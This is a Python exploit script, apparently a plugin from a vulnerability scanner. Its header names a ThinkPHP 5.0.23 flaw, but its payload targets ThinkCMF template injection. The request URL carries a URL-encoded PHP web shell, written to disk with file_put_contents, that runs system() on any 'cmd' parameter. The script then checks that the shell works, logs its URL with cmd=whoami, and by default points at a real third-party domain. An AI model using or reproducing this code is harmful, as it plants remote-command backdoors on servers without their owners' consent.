#!/usr/bin/env python3

'''
name: ThinkPHP5 5.0.23 远程代码执行漏洞
description: ThinkPHP5 5.0.23 远程代码执行漏洞
'''

import json
import urllib
from app.lib.utils.request import request


class Thinkcmf_Rce_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        url = self.url + '''/index.php?a=fetch&templateFile=public/inde&prefix=%27%27&content=<php>file_put_contents('0a30e0d61182dbb7c1eed5135787fb84.php','%3c%3f%70%68%70%0d%0a%65%63%68%6f%20%6d%64%35%28%22%54%68%69%6e%6b%43%4d%46%22%29%3b%0d%0a%20%20%20%20%69%66%28%69%73%73%65%74%28%24%5f%52%45%51%55%45%53%54%5b%22%63%6d%64%22%5d%29%29%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%65%63%68%6f%20%22%3c%70%72%65%3e%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%63%6d%64%20%3d%20%28%24%5f%52%45%51%55%45%53%54%5b%22%63%6d%64%22%5d%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%73%79%73%74%65%6d%28%24%63%6d%64%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%65%63%68%6f%20%22%3c%2f%70%72%65%3e%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%64%69%65%3b%0d%0a%20%20%20%20%7d%0d%0a%70%68%70%69%6e%66%6f%28%29%3b%0d%0a%3f%3e')</php>'''
        try:
            req = request.get(url, headers = self.headers)
            response_str = json.dumps(req.headers.__dict__['_store'])
            if req.status_code == 200 and 'PHP' in response_str:
                self.check_shell()
                return True
            else:
                print("不存在ThinkCMF 漏洞")
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

    def check_shell(self):
        shell_url = self.url + '/0a30e0d61182dbb7c1eed5135787fb84.php'
        try:
            check_req = request.get(shell_url, headers = self.headers)
            if check_req.status_code == 200 and b'0a30e0d61182dbb7c1eed5135787fb84' in check_req.content:
                with open('success.txt', 'at') as f:
                    f.writelines(self.url + "/0a30e0d61182dbb7c1eed5135787fb84.php?cmd=whoami" + '\n')
                print(self.url + "/0a30e0d61182dbb7c1eed5135787fb84.php?cmd=whoami")
            else:
                print("shell上传失败")
        except Exception as e:
            print(e)
            pass
        finally:
            pass

if __name__ == '__main__':
    ThinkCMF_RCE = Thinkcmf_Rce_BaseVerify('http://baidu.com')
    ThinkCMF_RCE.run()

